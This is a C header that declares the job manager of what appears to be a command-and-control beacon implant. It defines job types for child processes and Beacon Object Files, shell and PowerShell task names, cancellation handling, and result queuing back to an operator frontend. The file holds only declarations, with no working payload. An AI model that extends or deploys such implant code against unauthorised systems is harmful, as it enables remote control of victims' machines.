#pragma once

#include "beacon_common.h"

struct BeaconContext;

typedef enum JobType {
    JOB_TYPE_PROCESS = 1,
    JOB_TYPE_BOF = 2
} JobType;

typedef enum JobState {
    JOB_STATE_RUNNING = 1,
    JOB_STATE_STOPPING = 2
} JobState;

typedef struct BeaconJob {
    UINT32 task_id;                /* 前端任务 ID，同时作为 job id */
    UINT32 command_id;             /* 原始命令 ID，用于结果回包 */
    JobType type;                  /* process / BOF 等 job 类型 */
    JobState state;                /* 当前运行状态 */
    CHAR name[64];                 /* 简短名称：shell、powershell、bof 等 */
    CHAR ref[128];                 /* 可选引用信息，如文件路径或任务标识 */
    CHAR detail[256];              /* 可选详情，用于 jobs 展示 */
    HANDLE thread_handle;          /* job 主线程句柄 */
    HANDLE cancel_event;           /* 协作式取消事件 */
    volatile LONG cancel_requested; /* 协作式取消标志 */
    HANDLE process_handle;         /* process job 的子进程句柄 */
    ULONGLONG started_at;          /* Unix 时间戳，用于展示运行时长 */
    struct JobManager* owner;      /* 所属管理器 */
    struct BeaconJob* next;        /* 管理器链表指针 */
} BeaconJob;

typedef struct JobManager {
    CRITICAL_SECTION lock;         /* 保护 jobs 链表和 job 句柄字段 */
    BeaconJob* jobs;               /* 活跃 job 链表 */
    volatile LONG shutting_down;   /* 管理器关闭中，拒绝创建新 job */
} JobManager;

VOID JobInit(JobManager* jm);
VOID JobFree(JobManager* jm);

BeaconJob* JobCreate(struct BeaconContext* ctx, UINT32 task_id, UINT32 command_id,
                     JobType type, const CHAR* name);
BOOL JobStartThread(BeaconJob* job, LPTHREAD_START_ROUTINE start, PVOID arg);
VOID JobComplete(BeaconJob* job);
BOOL JobIsCancelRequested(const BeaconJob* job);
VOID JobSetProcessHandle(BeaconJob* job, HANDLE process_handle);
VOID JobEnqueueResult(struct BeaconContext* ctx, UINT32 task_id, UINT32 command_id,
                      const ByteBuf* payload);
